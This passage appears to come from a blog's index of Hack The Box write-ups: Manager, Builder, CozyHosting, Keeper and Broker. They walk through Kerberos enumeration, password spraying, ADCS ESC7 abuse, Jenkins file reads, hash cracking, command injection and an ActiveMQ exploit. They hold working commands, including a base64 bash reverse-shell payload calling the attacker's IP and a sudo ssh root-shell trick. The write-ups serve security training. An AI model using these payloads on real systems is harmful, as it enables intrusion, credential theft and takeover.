|   3:1:1: |_    Message signing enabled and required| smb2-time: |   date: 2024-03-13T19:15:13|_  start_date: N/A|_clock-skew: mean: 6h59m31s, deviation: 0s, median: 6h59m31sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Wed Mar 13 17:46:19 2024 -- 1 IP address (1 host up) scanned in 92.43 secondsPost nmap scan we could identify that there are several ports open, including typical domain controllers services, web server on port 80, SMB on port 445 and SQL on 1433.Web:I ensured to add manager.htb to be added to /etc/hosts file with the corresponding IP address in order forus to be able to access the domain in our browser.The website hosted on port 80 seems to static and doesn’t seems to have much of a functionality.Kerberos:I wasn’t able to find anything with SMB. Hence, I moved on with brute forcing Kerberos to enumerate usernames.I utilized kerbrute a tool that sends Ticket-Granting Ticket (TGT) requests to the Key Distribution Centre (KDC) in the domain with no pre-authentication. If the KDC responds with a PRINCIPAL UNKNOWN error, the username does not exist. However, if the KDC prompts for pre-authentication, we know the username exists and we move on. This does not cause any login failures so it will not lock out any accounts../kerbrute userenum -d manager.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.129.220.106   / /_____  _____/ /_  _______  __/ /____   / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __//_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        Version: v1.0.3 (9dad6e1) - 03/13/24 - Ronnie Flathers @ropnop2024/03/13 18:10:43 &gt;  Using KDC(s):2024/03/13 18:10:43 &gt;  \t10.129.220.106:882024/03/13 18:10:44 &gt;  [+] VALID USERNAME:\t ryan@manager.htb2024/03/13 18:10:46 &gt;  [+] VALID USERNAME:\t guest@manager.htb2024/03/13 18:10:47 &gt;  [+] VALID USERNAME:\t cheng@manager.htb2024/03/13 18:10:48 &gt;  [+] VALID USERNAME:\t raven@manager.htb2024/03/13 18:10:52 &gt;  [+] VALID USERNAME:\t administrator@manager.htb2024/03/13 18:11:03 &gt;  [+] VALID USERNAME:\t Ryan@manager.htb2024/03/13 18:11:05 &gt;  [+] VALID USERNAME:\t Raven@manager.htb2024/03/13 18:11:10 &gt;  [+] VALID USERNAME:\t operator@manager.htb2024/03/13 18:11:53 &gt;  [+] VALID USERNAME:\t Guest@manager.htb2024/03/13 18:11:53 &gt;  [+] VALID USERNAME:\t Administrator@manager.htb2024/03/13 18:12:28 &gt;  [+] VALID USERNAME:\t Cheng@manager.htb2024/03/13 18:14:10 &gt;  [+] VALID USERNAME:\t jinwoo@manager.htbI filtered out the usernames using the below command and saved them to a file named users.txt.grep -Eo '[^ ]+@[^ ]+' usernames.txt | cut -d@ -f1 &gt; users.txt  grep: This tool searches for patterns in text files.  -E: This option enables extended regular expressions.  o: This option tells grep to print only the matched part of the line (username).  [^ ]+@[^ ]+: This is the regular expression that matches one or more characters that are not spaces ([^ ]+), followed by “@” symbol, and then again one or more characters that are not spaces. This effectively captures usernames with or without spaces but excludes lines starting with “&gt;”.Many people use the same word for their username and password. This makes it easy to try guessing passwords for many accounts at once. We can use a password spraying tool to try logging in to a system using usernames from a list and see if the password is the same username.crackmapexec smb manager.htb -u users.txt -p users.txt password sprayingWe now have the credentials for user operator with password operator.Foothold:I tried to access accessing SMB shares using operator credentials but there was nothing that we could leverage.I moved on attempting access to MSSQL server,  with SQL server we might have some level of access to filesystem.impacket-mssqlclient -port 1433 manager.htb/operator:operator@10.129.220.106 -windows-auth MSSQL Server LoginWhile trying to figureout whats next, I came accross an article from hacktricks and learned that we can use the xp_dirtree procedure to traverse the filesystem and list folders.Initially, I checked for level of permission for xp_dirtree.EXEC sp_helprotect 'xp_dirtree'; Permissions: xp_dirtreeNow, I inspected the contents of the web-root folder /inetpub/wwwroot to see if we have anything that we can leverage. xp_dirtree:/inetpub/wwwrootFound an interesting file website-backup-27-07-23-old.zip, which seems to be a backup of the website.Given its location within the web root folder, we can go ahead and use wget to download the file.wget http://manager.htb/website-backup-27-07-23-old.zipPrivilege Escalation:To User Access:While unzipping the backup file, we can see a hidden file .old-config.xml. backup filesThe .old-conf.xml file reveals the password R4v3nBe5tD3veloP3r!123 for the user Raven. old-config.xmlI used the obtained credentials to connect to the WinRM service running on the target. Evil-WinRM: UserWe now own the USER for this machine!From User to Root:I checked the privileges and observed that SeMachineAccountPrivilege is enabled. Unfortunately, there is not much that we can leverage.Given an Active Directory domain, it might have an Active Directory Certificate Service (ADCS) set up. ADCS acts like a Public Key Infrastructure (PKI), essentially managing digital certificates for authentication within the domain. And can contain vulnerabilities that can be leveraged to gain certificates and hashes of other users.I utilized certipy to find any vulnerabilities that may exist. Which indicated that the user Raven possesses hazardous permissions, particularly having “ManageCA” rights over the Certification Authority. certipy enumeration certipy output reportBy leveraging the ESC7 scenario, we could potentially elevate our privileges to Domain Admin while operating as user Raven. There is hacktricks article which has a detailed explanation.To leverage this vulnerability, we would need to add Raven as an “officer” which will allow us to have the ability to manage certificates and issue them.certipy-ad ca -add-officer raven -ca 'manager-DC01-CA' -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.220.78Now we as an office can issue and manage certificates, lets enabled SubCA template on the CA.certipy-ad ca -ca 'manager-DC01-CA' -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -enable-template 'SubCA' -dc-ip 10.129.220.78Certipy v4.7.0 - by Oliver Lyak (ly4k) [*] Successfully enabled 'SubCA' on 'manager-dc01-ca'Now as we can Manage Certificate and have the SubCA template enabled. We can request a certificate based on SubCA template.certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -template 'SubCA' -target manager.htb -upn administrator@manager.htb Reqesting SubCA CertThe request was denied but as we see we have certificate request ID is 18 and have obtained the private key.Let us manually issue the failed certificate with the ca through our obtained permissions.certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.220.78 -ca manager-dc01-ca -issue-request 18 Certipy v4.7.0 - by Oliver Lyak (ly4k) [*] Successfully issued certificateNow, we retrieve the issued certificate.certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -retrieve 18 Retrieve CA CertificateWe now have possession of administrators PFX file. We can now utilize the PFX to authenticate however it fails with the error “KRB_AP_ERR_SKEW (Clock skew too great)”.┌──(root㉿Brahma)-[/home/kasyap/kalki/HTB/Manager]└─# certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.220.78Certipy v4.8.2 - by Oliver Lyak (ly4k)[*] Using principal: administrator@manager.htb[*] Trying to get TGT...[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)The \"KRB_AP_ERR_SKEW\" error occurs when there is a significant time difference between the client and the KDC servers, impacting the Kerberos authentication process.To resolve this issue, we would need to disable auto date and time update in our machine and synchronize our clock with manager.htb machine.┌──(root㉿Brahma)-[/home/kasyap/kalki/HTB/Manager]└─# timedatectl set-ntp 0                                                                                                                                                                                              ┌──(root㉿Brahma)-[/home/kasyap/kalki/HTB/Manager]└─# ntpdate -u manager.htb                                     2024-03-14 03:27:51.880462 (+0530) +25171.590795 +/- 0.023919 manager.htb 10.129.220.78 s1 no-leapCLOCK: time stepped by 25171.590795                                            Now with synchronized time between our machine and manager.htb I ran the command again to retrieve the administrator hash.┌──(root㉿Brahma)-[/home/kasyap/kalki/HTB/Manager]└─# certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.220.78Certipy v4.8.2 - by Oliver Lyak (ly4k)[*] Using principal: administrator@manager.htb[*] Trying to get TGT...[*] Got TGT[*] Saved credential cache to 'administrator.ccache'[*] Trying to retrieve NT hash for 'administrator'[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924efAs we have the administrator hash, I leveraged it to gain access through Evil-WinRM.┌──(root㉿Brahma)-[/home/kasyap/kalki/HTB/Manager]└─# evil-winrm -i 10.129.220.78 -u administrator -H ae5064c2f62317332c88629e025924ef                                         Evil-WinRM shell v3.5                                        Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                        Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                        Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; cd ..*Evil-WinRM* PS C:\\Users\\Administrator&gt; cd Desktop*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; whoamimanager\\administrator*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; dir    Directory: C:\\Users\\Administrator\\DesktopMode                LastWriteTime         Length Name----                -------------         ------ -----ar---        3/13/2024   2:36 PM             34 root.txtWe have the machine ROOTED!"
  },
  
  {
    "title": "Hack The Box | Builder Writeup",
    "url": "/posts/htb-builder-writeup/",
    "categories": "Blogging, Writeup, Hack The Box",
    "tags": "Builder, HTB, Writeup",
    "date": "2024-03-15 23:00:00 +0530",
    





    
    "snippet": "Summary:Builder, is a medium-difficulty Linux machine, runs a Jenkins instance. The attacker finds a vulnerability (CVE-2024-23897) in Jenkins, allowing unauthorized access to read files on the sys...",
    "content": "Summary:Builder, is a medium-difficulty Linux machine, runs a Jenkins instance. The attacker finds a vulnerability (CVE-2024-23897) in Jenkins, allowing unauthorized access to read files on the system.Exploiting this vulnerability, the attacker extracts the username and password crackable hash for the Jenkins user. Which is then used to log in to the Jenkins instance.Finally, the attacker uses an encrypted SSH key to escalate privileges and gain full root access on the Builder machine.Enumeration:Port Scan:Let’s start with nmap scan to see open ports and services.# Nmap 7.94SVN scan initiated Wed Mar 13 15:35:33 2024 as: nmap -sV -sC -oA builder 10.129.230.220Nmap scan report for 10.129.230.220Host is up (0.058s latency).Not shown: 998 closed tcp ports (reset)PORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)8080/tcp open  http    Jetty 10.0.18|_http-title: Dashboard [Jenkins]| http-robots.txt: 1 disallowed entry |_/| http-open-proxy: Potentially OPEN proxy.|_Methods supported:CONNECTION|_http-server-header: Jetty(10.0.18)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Wed Mar 13 15:35:43 2024 -- 1 IP address (1 host up) scanned in 10.26 secondsThe Nmap scan revealed SSH and Jenkins on their default ports i.e., 22 and 8080, respectively.Jenkins:While visiting the http:// 10.129.230.220:8080, we land on default Jenkins page. jenkinsAs we see at the bottom right of the page we can see the installed version of Jenkins. With some Online research reveals a critical vulnerability CVE-2024-23897 affecting this version. Which allows unauthenticated attackers to read files on Jenkins controller file system.The above proof of concept suggests that use of Jenkins-cli.jar to exploit vulnerability and the Jenkins-cli.jar file can be retrieved from host machine itself.wget http://10.129.230.220:8080/jnlpJars/jenkins-cli.jarjava -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http help 1 \"@/etc/passwd\"ERROR: Too many arguments: daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin java -jar jenkins-cli.jar help [COMMAND] Lists all the available commands or a detailed description of single command. COMMAND: Name of the command (default: root:x:0:0:root:/root:/bin/bash)Initial Steps:As we know that exploit works, let’s enumerate further. With some efforts which didn’t work out I went ahead and looked at the environment variables.java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.129.230.220:8080' help \"@/proc/self/environ\" HOSTNAME=0f52c222a4ccHOME=/var/jenkins_home  /proc/self/environ is a virtual file in Linux that holds the environment variables for the currently running process.  This file is useful for the process itself to access its environment variables, but it can also be accessed by some programs.Now, with this we know that the home directory is found at /var/jenkins_home.Looking further into it we see user.txt file.java -jar jenkins-cli.jar -noCertificateCheck -s 'http://10.129.230.220:8080' help \"@/var/jenkins_home/user.txt\"We now own the user of machine.Privilege escalation to Root:On another online search took me to an article on setting up Jenkins, which revealed key information on user records and key files that may be useful.Based on the article there should be a users.xml file that should be giving us admin username (Jenkins web portal).java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http connect-node \"@/var/jenkins_home/users/users.xml users.xmlAwesome we now have the username  jennifer_12108429903186576833 Now for the password we need to look into config.xml file under username folder.java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http connect-node \"@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml\"Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true    &lt;hudson.tasks.Mailer_-UserProperty plugin=\"mailer@463.vedf8358e006b_\"&gt;: No such agent \"    &lt;hudson.tasks.Mailer_-UserProperty plugin=\"mailer@463.vedf8358e006b_\"&gt;\" exists.........&lt;?xml version='1.1' encoding='UTF-8'?&gt;: No such agent \"&lt;?xml version='1.1' encoding='UTF-8'?&gt;\" exists.  &lt;fullName&gt;jennifer&lt;/fullName&gt;: No such agent \"    &lt;fullName&gt;jennifer&lt;/fullName&gt;\" exists.      &lt;seed&gt;6841d11dc1de101d&lt;/seed&gt;: No such agent \"            &lt;seed&gt;6841d11dc1de101d&lt;/seed&gt;\" exists.  &lt;id&gt;jennifer&lt;/id&gt;: No such agent \"  &lt;id&gt;jennifer&lt;/id&gt;\" exists.  &lt;version&gt;10&lt;/version&gt;: No such agent \"  &lt;version&gt;10&lt;/version&gt;\" exists.      &lt;tokenStore&gt;: No such agent \"      &lt;tokenStore&gt;\" exists.          &lt;filterExecutors&gt;false&lt;/filterExecutors&gt;: No such agent \"                    &lt;filterExecutors&gt;false&lt;/filterExecutors&gt;\" exists.    &lt;io.jenkins.plugins.thememanager.ThemeUserProperty plugin=\"theme-manager@215.vc1ff18d67920\"/&gt;: No such agent \"    &lt;io.jenkins.plugins.thememanager.ThemeUserProperty plugin=\"theme-manager@215.vc1ff18d67920\"/&gt;\" exists.      &lt;passwordHash&gt;#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a&lt;/passwordHash&gt;:             No such agent \"      &lt;passwordHash&gt;#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a&lt;/passwordHash&gt;\" exists.ERROR: Error occurred while performing this command, see previous stderr output.This revealed a hashed password $2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a for the user.I was able to crack the password using hashcat.sudo hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt hashcatUsing the credentials jennifer:princess, we can log into the remote Jenkins instance.Enumerating further, I saw SSH keys stored in Global credentials.  Going into the confiuration  I saw the SSH key belongs to root.  However, trying to view the key it says Concealed for confidentiality. users.xmlInspecting the page elements, I saw there is a hidden form filed which reaved encrypted private key. Concealed for confidentialityBack to online research, I learned we can decrypt the encrypted key from console itself using hudson.util.Secret.decrypt() function. jenkins: Decrypting SSH keyWe can save the decrypted key and login root with the key through SSH. SSH: Login as Root  nano root_idsa: This command opens the file named id_rsa using the nano text editor. You can paste your SSH private key content into this editor and save the file.  chmod 600 root_idsa: This command changes the permissions of the id_rsa file. The first digit (6) stands for the owner’s permissions, 6 translates to read and write permissions for the owner. The second and third digits (00) represent permissions for the group and others, since both are set to 0, neither the group nor others have any permissions (read, write, or execute) for this file.We have the machine ROOTED! "
  },
  
  {
    "title": "Hack The Box | CrazyHosting Writeup",
    "url": "/posts/htb-crazyhosting-writeup/",
    "categories": "Blogging, Writeup, Hack The Box",
    "tags": "CrazyHosting, HTB, Writeup",
    "date": "2024-03-02 23:00:00 +0530",
    





    
    "snippet": "The Machine IP address (victim): 10.129.229.88Enumeration:Port ScanLets take the first step with nmap scan nmap -sV -A -T5 -oA 10.129.229.88 10.129.229.88# Nmap 7.80 scan initiated Mon Jan 29 17:37...",
    "content": "The Machine IP address (victim): 10.129.229.88Enumeration:Port ScanLets take the first step with nmap scan nmap -sV -A -T5 -oA 10.129.229.88 10.129.229.88# Nmap 7.80 scan initiated Mon Jan 29 17:37:54 2024 as: nmap -sV -A -T5 -oA 10.129.229.88 10.129.229.88Nmap scan report for 10.129.229.88Host is up (0.16s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp open  http    nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://cozyhosting.htbAggressive OS guesses: HP P2000 G3 NAS device (93%), Linux 2.6.32 (92%), Infomir MAG-250 set-top box (92%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (92%), Linux 3.7 (92%), Ubiquiti AirOS 5.5.9 (92%), Ubiquiti Pico Station WAP (AirOS 5.2.6) (92%), Linux 2.6.32 - 3.13 (92%), Linux 3.3 (92%), Linux 2.6.32 - 3.1 (91%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTE (using port 110/tcp)HOP RTT       ADDRESS1   163.73 ms 10.10.14.12   163.94 ms 10.129.229.88OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Mon Jan 29 17:38:14 2024 -- 1 IP address (1 host up) scanned in 19.38 secondsNmap scan gave out SSH running on port 22, Nginx HTTP web server running on port 80.Web:Let’s add cozyhosting.htb to our /etc/hosts file with the corresponding IP address in order forus to be able to access the domain in our browser.echo \"10.129.229.88 cozyhosting.htb\" &gt;&gt; /etc/hosts landing pageAs we have the web page access lets go ahead and s fuzz the server for files and directories. We will be using dirsearchdirsearch -u http://cozyhosting.htb/ Dirsearch outputWe do observe the login and admin pages, and additionally, we notice that the actuator endpoint is exposed.  Actuator endpoint:primarily utilized for debugging purposes in Spring Boot applications. The Spring Boot actuator module offers a range of built-in endpoints that expose various types of information and operations within an application.While accessing the /login page and attempting to authenticate with common credentials (password guessing), we are unable to gain access to the application. Login PageFoothold:I went ahead and started Burp and intercepted, looking at the actuator/sessions endpoint, we are able to list all the active sessions and their session IDs. Actuator SessionsNow, we have session identifier token for kanderson, which we can grab and  modify the headers and replace the cookie vaule using burp or browser by using the developer console’s Storage tab. Modfied CookieWe are now presented with a dashboard and notice that we are logged in as the user K. Anderson. Post LoginLooking at the bottom of the page, we see a form that require’s a hostname and username for automatic patching. If we try submitting the form with the username test and the hostname 127.0.0.1, we get an error back stating that the host was not added. testing form fieldsWe know that the username field does not accept white spaces, so to bypass this we can use ${IFS} as a delimiter, which is a special shell variable that stands for Internal Field Separator and defaults to a space (followed by a tab and a newline) in shells like Bash and shTo test for injection vulnerabilities we need to use Burp again. I put up a python local server on my machine and tried to curl it from the target server.Using the following payload in the username field, to see if we get a callback.test;curl${IFS}http:/10.10.14.68:8000;which worked! as we see a request to our local server, confirming the command injection.python -m http.serverServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)10.129.229.88 - - [29/Jan/2024 18:15:51] \"GET / HTTP/1.1\" 200 -Now we know that command injection works, I went ahead and tried a oneliner payload which didn’t worked. However with some research I leanered that we can encode the payload to base64 and then URL encode will work.Converting payload to base64:echo \"bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;port&gt; 0&gt;&amp;1\" | base64 -w 0YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42OC80NDQ0IDA+JjEKFinal Payload:;echo${IFS}\"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42OC80NDQ0IDA+JjEK\"|base64${IFS}-d|bash;As we know this playload will not work as we need to remove the spaces, like we did earlier by adding ${IFS} as a delimiter.;echo${IFS%??}\"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44Ny80NDQ0IDA+JjEK\"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;I went ahead and pasted the payload in to burp repeater and URL encoded the payload. I started a netcat listener and send the payload to the target. It should hang and the RCE attempt is successful. Now we have access as app user to the machine. gaining reverse shellNext step stabilizing the shell!python3 -c 'import pty; pty.spawn(\"/bin/bash\")'Ctrl-Zstty raw -echo; fg#Press Enter twice, and type the command export TERM=xterm Privilege Escalation:To User Access:Now that we have our shell setup, let’s look around for user flag.It seems the user flag is in the user josh’s home directory. There is a jar file placed under the app directory.To carry out the analysis, I transfer the file from target machine to my pc using netcat.# On attacking machine (Destination).nc -l -p  4444 &gt; cloudhosting-0.0.1.jar# On Target machine (Source).nc 10.10.14.68 4444 &lt; cloudhosting-0.0.1.jarI opened the jar file using JD_GUI and looking around I was able to retrive postgress credentials. JD-GUI:cloudhosting-0.0.1.jarI went ahead and logged to Postgres with the credentials and we are in.app@cozyhosting:/app$ psql -h 127.0.0.1 -U postgres -W Password: psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)Type \"help\" for help.postgres=#Once I logged in to the database, I went ahead and pivoted through the tables andproceed with utilizing the SELECT statement to view all the data present in the users table.select * users;    name    |                           password                           | role  -----------+--------------------------------------------------------------+------- kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin(2 rows)(END)With the user hash in hand, I tried cracking it with hashcat.sudo hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt hashcatI was able to successfully crack the password, obtaining the password manchesterunitedWe can either switch user to josh or connect through a ssh session using the passwords.ssh josh@crazyhosting.htb SSH LoginFrom User to Root:Once logged in, Upon checking the sudo permissions for the user josh, I discover that they can run /usr/bin/ssh as root. sudo -lAs we see Josh user has unrestricted privileges to run ssh as root and can specify any argument.There is a payload at GTFOBINS which allows us to get the shell as root.sudo ssh -o ProxyCommand=';sh 0&lt;&amp;2 1&gt;&amp;2' x rooted  When the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.We have the machine ROOTED!"
  },
  
  {
    "title": "Hack The Box | Keeper Writeup",
    "url": "/posts/htb-keeper-writeup/",
    "categories": "Blogging, Writeup, Hack The Box",
    "tags": "keeper.htb, HTB, Writeup",
    "date": "2024-02-10 00:00:00 +0530",
    





    
    "snippet": "The Machine IP address (victim): 10.129.27.235Enumeration:Port Scan# Nmap 7.80 scan initiated Tue Jan 30 20:01:25 2024 as: nmap -sV -A -T5 -Pn -oA 10.129.27.235 10.129.27.235Nmap scan report for ti...",
    "content": "The Machine IP address (victim): 10.129.27.235Enumeration:Port Scan# Nmap 7.80 scan initiated Tue Jan 30 20:01:25 2024 as: nmap -sV -A -T5 -Pn -oA 10.129.27.235 10.129.27.235Nmap scan report for tickets.keeper.htb (10.129.27.235)Host is up (0.24s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp open  http    nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Login|_http-trane-info: Problem with XML parsing of /evox/aboutAggressive OS guesses: Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTE (using port 1720/tcp)HOP RTT       ADDRESS1   237.57 ms 10.10.14.12   237.73 ms tickets.keeper.htb (10.129.27.235)OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/.# Nmap done at Tue Jan 30 20:01:48 2024 -- 1 IP address (1 host up) scanned in 22.75 secondsSo, we have a SSH on default 22 and HTTP on port 80. I went ahead and browsed by pasting the IP address which gave out the host entry that I need to do to access the web application.Foothold: Host entryI went ahead and added tickets.keeper.htb to /etc/hosts and went back to web application which gave me a login screen for Best practical RT. Login promptWith my initial Google search, I came to know the default credential for the admin portal is root: password which worked! Google FU: default RT passwordPost login I the first thing that came to my eyes was admin options which enables me to see user attributes. Exploring Admin OptionsPrivilege Escalation:To User Access:While exploring the user attributes, we can see in comment section the temporary password set for the user. Exploring Admin OptionsUsing the credentials we obtained, I was able to gain access to the machine with through SSH. SSHL Login - User OwnedWe now own the USER for this machine!From User to Root:As we see in above screenshot, we do have a ZIP file placed under the user’s folder. I downloaded the file and extracted the contents.The ZIP file had passcodes.kdbx and KeePassDumpFull.dmp by searching the web I these file belong to KeepPass password manager found a relevant  PoC to retrieve master password from crash dump files.Google-Fu: KeePassDumpFull.dmpOkay next step is to boot a windows machine to use the PoC as it requires dotnet to run the exploit (effortless way). However, I to a chance and explored Linux version of dotnet and installed dotnet SDK 7, the required version for this PoC to work.After setting up dotnet I went ahead and executed the exploit using the below.dotnet run KeePassDumpFull.dmpexecuting PoCThe exploit worked and gave out the below output to be “master password.”Output from ExploitWhile it made me think for a while, I went ahead and googled and could get the below result.Google FU: Master PasswordWhich turns out to be rødgrød med fløde a Danish dessert and we do know Lnorgaard is from Denmark so, I tried it.For which I had to download [KeePass2] (https://keepass.info/) and opened passcodes.kdbx file which we extracted from the ZIP file and it worked.  I initially tried wine but did not work for me so I used a Windows 10 VirtualBox machine for later steps. Also there is an alternative community based Linux version of keeppass2 avaliable.KeePass: Master PasswordOnce we enter the “master password,” we see that root user have stored its SSH public key in puttygen format.KeePass: Root PuttyGen  Puttygen is a key generator tool that comes as part of the PuTTY suite, a popular open-source program for secure remote connections. Primarily, it focuses on generating and managing SSH keys, which are cryptographic pairs used for secure authentication on remote servers.Now, what we need to do is to have the puttygen key saved into a ppk file and convert it into a pem file which might grant us ability to SSH as root.  PPK: is puttygen file format Putty Private Key.  PEM: private key format defined in [RFC1422](https://www.rfc-editor.org/rfc/rfc1422) used by open source tools like OpenSSL/OpenSSH.if you are using Linux machine for this step you might need to install putty-toolssudor apt-get install putty-toolsOnce installed you can convert/generate the private key from Putty Private key to pem by below command.puttygen id_dsa.ppk -O private-openssh -o id_dsaNow, as we have a private key that we can work with to login to SSH let us try it!Machine Owned!Done, the Key worked and we have the machine ROOTED!."
  },
  
  {
    "title": "Hack The Box | Broker Writeup",
    "url": "/posts/htb-broker-writeup/",
    "categories": "Blogging, Writeup, Hack The Box",
    "tags": "Broker, HTB, Writeup",
    "date": "2024-02-02 23:00:00 +0530",
    





    
    "snippet": "The Machine IP address (victim): 10.129.27.9Enumeration:Port ScanLets take the first step with nmap scan nmap -sV -A -T5 10.129.27.9 -oA 10.129.27.9# Nmap 7.94SVN scan initiated Fri Feb  2 21:06:29...",
    "content": "The Machine IP address (victim): 10.129.27.9Enumeration:Port ScanLets take the first step with nmap scan nmap -sV -A -T5 10.129.27.9 -oA 10.129.27.9# Nmap 7.94SVN scan initiated Fri Feb  2 21:06:29 2024 as: nmap -sV -A -T5 -oA 10.129.27.9 10.129.27.9Warning: 10.129.27.9 giving up on port because retransmission cap hit (2).Nmap scan report for 10.129.27.9Host is up (0.23s latency).Not shown: 997 closed tcp ports (conn-refused)PORT    STATE    SERVICE   VERSION22/tcp  open     ssh       OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)80/tcp  open     http      nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)| http-auth: | HTTP/1.1 401 Unauthorized\\x0D|_  basic realm=ActiveMQRealm|_http-title: Error 401 Unauthorized280/tcp filtered http-mgmtService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Fri Feb  2 21:06:57 2024 -- 1 IP address (1 host up) scanned in 28.21 secondsNmap scan gave out port 22 SSH, 80 Nginx and 280 filtered. I am settling with this for now and will initiate a separate scan if needed 😊.I went ahead and opened the page which prompted me for password. My first try was to just put in admin as username as well as password. Login promptWhich worked and presented me with ActiveMQ admin page. While looking further it gave the version as 5.15.15. Version DisclosureFoothold:I went ahead and searched for any relevant vulnerability, and it came out there is a vulnerability for 5.15.15 version of ActiveMQ CVE-2023-46604.Privilege Escalation:To User Access:I cloned the github repo and modified the poc.xml file with a payload for reverse shell and started netcat listener on port 4444.&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt;    &lt;beans xmlns=\"http://www.springframework.org/schema/beans\"       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"       xsi:schemaLocation=\"     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"&gt;        &lt;bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\"&gt;            &lt;constructor-arg &gt;            &lt;list&gt;                &lt;value&gt;bash&lt;/value&gt;                &lt;value&gt;-c&lt;/value&gt;                &lt;value&gt;bash -i &amp;gt;&amp;amp; 